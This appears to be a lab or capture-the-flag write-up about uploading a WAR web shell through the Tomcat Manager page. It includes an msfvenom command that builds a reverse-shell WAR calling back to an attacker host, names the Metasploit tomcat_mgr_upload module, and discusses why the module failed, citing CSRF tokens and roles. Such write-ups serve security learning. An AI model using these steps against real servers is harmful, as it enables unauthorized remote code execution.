When we navigate to the manager page, we can see there is a button to submit a file. There we have to upload a shell. But first we have to know what programming language the shell has to be.

Tomcat runs on JVM, so the payload MUST be something the Servlets/JSP engine can execute. 

There are three different ways we can upload a shell:

1. JSP shell packed inside a WAR file
A WAR is basically a ZIP with Java web application structure (`WEB-INF/web.xml`, classes, JSPs). When the WAR is uploaded via Manager and it deploys, Tomcat decompresses it in `webapps/` and it remains accesible like `http://target:8080/<war_file>/shell.jsp`. So, you have to accessthrough HTTP and you can obtain command execution on the server-side.

2. Generate it with msfvenom
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_IP> LPORT=<port> -f war > shell.war
```

This builds you up the WAR file ready with a reverse shell JSP inside.

3. With metasploit
There is a module that automates this: `exploit/multi/http/tomcat_mgr_upload`. Login to manager, uploads the WAR, deploys and gives the session, without interacting with the file directly.

I'm going to try the metasploit method, because the server is so slow. 

When I tried using the module, it failed. This module does 2 things internally: it uploads and deplous the WAR (which clearly worked, because the payloads were listed in the manager page), and then it tries to trigger execution by sending a GET request to the deployed context. The most likely reason it failed at that second step:

1. CSRF token / session handling mismatch.
The Tomcat Manager HTML interface (/manager/html/upload) is CSRF-protected, requiring a valid session cookie and CSRF token matched to the same session for every request. Metasploit's module retrieves a session/token once at the start, then reuses it for both the upload and the subsequent execution request. If Tomcat invalidates or rotates that session between those two steps (which happens more often with manager-gui-only roles, since CSRF protection is explicitly tied to the GUI interface, not the script interface), the second request silently fails — Tomcat won't execute or even serve content properly.

2. Role mismatch (the same root cause as before)
This module was written assuming manager-script access (the text interface), where execution-after-deploy is simpler and not CSRF-gated. Your user only has manager-gui, so the module ends up improvising through the CSRF-protected HTML interface, where the deploy step works (because it mimics the browser form post correctly) but the verification/execution step doesn't always replicate browser behavior precisely enough — different headers, missing referer, or token expiry.
3. Filename assumption
There's also a chance the module assumes the JSP filename pattern or path differently than what your Tomcat version (10.0.11) actually generates on deploy, so even if it gets a response back, it's hitting a 404 internally and reporting "failed to execute" without surfacing the real status code to you (which is exactly the failure mode we just saw manually with the 404).
